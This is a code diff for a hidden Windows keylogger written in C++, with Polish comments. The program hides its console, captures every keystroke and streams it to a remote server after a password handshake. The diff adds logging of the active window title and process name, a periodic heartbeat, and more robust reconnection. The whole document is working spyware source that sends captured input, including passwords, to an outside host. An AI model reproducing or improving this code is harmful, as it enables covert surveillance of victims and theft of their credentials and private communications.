@@ -2,6 +2,7 @@
 
 #include <winsock2.h>
 #include <windows.h>
+#include <psapi.h>
 #include <iostream>
 #include <string>
 #include <unordered_map>
@@ -11,6 +12,7 @@
 #include <atomic>
 
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "psapi.lib")
 
 std::unordered_map<int, std::string> specialKeys = {
     {VK_BACK, "BACKSPACE"}, {VK_TAB, "TAB"},     {VK_RETURN, "ENTER"},
@@ -33,7 +35,11 @@ std::string toUtf8(wchar_t wch) {
 bool sendKey(SOCKET sock, const std::string& key) {
     std::string message = key + "\n";
     int sent = send(sock, message.c_str(), message.size(), 0);
-    return sent != SOCKET_ERROR;
+    if (sent == SOCKET_ERROR) {
+        closesocket(sock);
+        return false;
+    }
+    return true;
 }
 
 void HideConsole() {
@@ -43,14 +49,41 @@ void HideConsole() {
 
 std::atomic<bool> running(true);
 
+std::string getActiveWindowInfo() {
+    HWND hwnd = GetForegroundWindow();
+    if (!hwnd) return "UNKNOWN_WINDOW";
+
+    char title[256];
+    GetWindowTextA(hwnd, title, sizeof(title));
+
+    DWORD pid;
+    GetWindowThreadProcessId(hwnd, &pid);
+
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    char procName[MAX_PATH] = "unknown.exe";
+
+    if (hProc) {
+        HMODULE hMod;
+        DWORD cbNeeded;
+        if (EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbNeeded)) {
+            GetModuleBaseNameA(hProc, hMod, procName, sizeof(procName));
+        }
+        CloseHandle(hProc);
+    }
+
+    return std::string(procName) + " – " + std::string(title);
+}
+
 void receiverThread(SOCKET sock) {
     char buffer[64];
     while (running) {
         int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
         if (bytesReceived <= 0) {
+            // rozłączony lub błąd
             running = false;
             break;
         }
+
         buffer[bytesReceived] = '\0';
         std::string msg(buffer);
         if (msg.find("DISCONNECT") != std::string::npos) {
@@ -61,7 +94,21 @@ void receiverThread(SOCKET sock) {
 }
 
 void keyloggerLoop(SOCKET sock) {
+    std::string lastWindow = "";
+    DWORD lastPing = GetTickCount();
+
     while (running) {
+        // Zmiana aktywnego okna
+        std::string currentWindow = getActiveWindowInfo();
+        if (currentWindow != lastWindow) {
+            if (!sendKey(sock, "[WINDOW] " + currentWindow)) {
+                running = false;
+                break;
+            }
+            lastWindow = currentWindow;
+        }
+
+        // Obsługa klawiszy
         for (int key = 1; key < 256; ++key) {
             SHORT state = GetAsyncKeyState(key);
             if (state & 0x8000) {
@@ -69,7 +116,8 @@ void keyloggerLoop(SOCKET sock) {
 
                 if (specialKeys.count(key)) {
                     toSend = specialKeys[key];
-                } else {
+                }
+                else {
                     BYTE keyboardState[256];
                     GetKeyboardState(keyboardState);
 
@@ -88,9 +136,19 @@ void keyloggerLoop(SOCKET sock) {
                     }
                 }
 
-                Sleep(100);
+                Sleep(100); // aby nie spamować tym samym klawiszem
             }
         }
+
+        // Wysyłanie PING co 10 sekund
+        if (GetTickCount() - lastPing > 10000) {
+            if (!sendKey(sock, "[PING]")) {
+                running = false;
+                break;
+            }
+            lastPing = GetTickCount();
+        }
+
         Sleep(10);
     }
 }
@@ -120,20 +178,38 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
 
         if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
-            send(sock, PASSWORD, strlen(PASSWORD), 0);
-
-            char response[64] = {0};
-            int received = recv(sock, response, sizeof(response) - 1, 0);
-
-            if (received > 0 && std::string(response).find("AUTH_OK") != std::string::npos) {
-                std::thread recvThread(receiverThread, sock);
-                keyloggerLoop(sock);
-                recvThread.join();
+            // Wyślij hasło
+            if (send(sock, PASSWORD, strlen(PASSWORD), 0) == SOCKET_ERROR) {
+                closesocket(sock);
+                continue;
             }
+
+            // Oczekiwanie na AUTH_OK z timeoutem
+            fd_set readfds;
+            FD_ZERO(&readfds);
+            FD_SET(sock, &readfds);
+
+            timeval timeout;
+            timeout.tv_sec = 5;
+            timeout.tv_usec = 0;
+
+            int sel = select(0, &readfds, nullptr, nullptr, &timeout);
+            if (sel > 0 && FD_ISSET(sock, &readfds)) {
+                char response[64] = { 0 };
+                int received = recv(sock, response, sizeof(response) - 1, 0);
+
+                if (received > 0 && std::string(response).find("AUTH_OK") != std::string::npos) {
+                    std::thread recvThread(receiverThread, sock);
+                    keyloggerLoop(sock);
+                    recvThread.join();
+                }
+            }
+
+            closesocket(sock);
         }
 
         closesocket(sock);
-        Sleep(3000); // spróbuj ponownie po chwili
+        Sleep(3000); // Odczekaj przed ponowną próbą
     }
 
     WSACleanup();
